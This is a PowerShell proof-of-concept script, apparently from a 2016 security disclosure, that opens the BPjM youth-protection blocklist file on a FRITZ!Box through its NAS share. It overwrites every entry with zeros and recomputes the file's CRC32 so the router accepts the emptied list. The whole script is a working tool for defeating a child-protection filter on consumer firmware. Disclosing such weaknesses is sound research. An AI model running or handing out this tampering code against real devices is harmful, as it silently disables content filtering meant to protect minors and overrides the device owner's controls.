#######################################################################################
#                                                                                     #
# proof of concept to dupe the BPjM filter list on a current FRITZ!OS device with     #
# internal storage backup for the current list                                        #
#                                                                                     #
#######################################################################################
#                                                                                     #
# Copyright (C) 2016 P.Hämmerlein (pentest@yourfritz.de)                              #
#                                                                                     #
#######################################################################################
#                                                                                     #
# the 1st parameter has to be the name of the NAS base directory (via Samba) of a     #
# FRITZ!Box device and write access has to be enabled to FRITZ\bpjm.data file below   #
# this point                                                                          #
#                                                                                     #
#######################################################################################
Param([Parameter(Mandatory = $True, Position = 0, HelpMessage = 'the FRITZ!Box NAS base directory path')][string]$NASBase
)
#######################################################################################
#                                                                                     #
# make debug output floating without interruptions                                    #
#                                                                                     #
#######################################################################################
if ($PSBoundParameters["Debug"] -and $DebugPreference -eq "Inquire") { $DebugPreference = "Continue" }
#######################################################################################
#                                                                                     #
# constants                                                                           #
#                                                                                     #
#######################################################################################
$headerSize = 60
$entrySize = 16 + 16 + 1
$crcSize = 4
$fileName = "FRITZ\bpjm.data"
#######################################################################################
#                                                                                     #
# inline class to compute a CRC32 value                                               #
# - it's much simpler in PS5, but we want to be able to use it on previous versions   #
#                                                                                     #
#######################################################################################
Add-Type -TypeDefinition @'
    public class CRC32 {
        private System.UInt32 crcPolynom = 0xEDB88320;
        private System.UInt32[] crcPolynomTable;
        private System.UInt32 crcValue = 0xFFFFFFFF;

        public CRC32() {
            System.UInt32 i, j, r;

            crcPolynomTable = new System.UInt32[256];
            for (i = 0; i < 256; i++) {
                r = i;
                for (j = 0; j < 8; j++) {
                    bool bitIsSet = ((r & 1) == 1);
                    r >>= 1;
                    if (bitIsSet) r ^= crcPolynom;
                }        
                crcPolynomTable[i] = r;
            }
        }

        public void Update(System.Byte[] buffer) {
            System.UInt32 i;

            for (i = 0; i < buffer.Length; i++) {
                crcValue = (crcValue >> 8) ^ crcPolynomTable[(buffer[i] ^ crcValue) & 255];
            }
        }

        public System.UInt32 Finish() {
            return ~crcValue;
        }
    }
'@
#######################################################################################
#                                                                                     #
# determine the file basics first and overwrite each entry with all zeros             #
#                                                                                     #
#######################################################################################
$Error.Clear()
try {
    $fs = [System.IO.File]::Open($NASBase+"\\"+$fileName, "Open", "ReadWrite")
    $firstBlock = New-Object System.Byte[] $headerSize
    $entry = New-Object System.Byte[] $entrySize
    $entries = ( $fs.Length - $crcSize - $headerSize ) / $entrySize
    $pos = $fs.Seek($crcSize, [System.IO.SeekOrigin]::Begin)
    $readBytes = $fs.Read($firstBlock, 0, $headerSize)
    if ($readBytes -lt $headerSize) {
        Write-Host "Read to few bytes for file header."
    }
    else {
        $crc = New-Object CRC32
        $crc.Update($firstBlock)
        for ($i = 0; $i -lt $entries; $i++) {
            $crc.Update($entry)
        }
        $crcValue = $crc.Finish()
        $pos = $fs.Seek(0, [System.IO.SeekOrigin]::Begin)
        $crcBuffer = New-Object System.Byte[] $crcSize
        for ($i = 0; $i -lt $crcSize; $i++) {
            $crcBuffer[$crcSize - 1 - $i] = $crcValue -shr (8 * $i) -band 255
        }
        $fs.Write($crcBuffer, 0, $crcSize)
        $pos = $fs.Seek($crcSize + $headerSize, [System.IO.SeekOrigin]::Begin)
        for ($i = 0; $i -lt $entries; $i++) {
            $fs.Write($entry, 0, $entrySize)
        }
        $fs.Flush()
    }
    $fs.Close()
}
catch {
    Write-Host $Error[0]
}
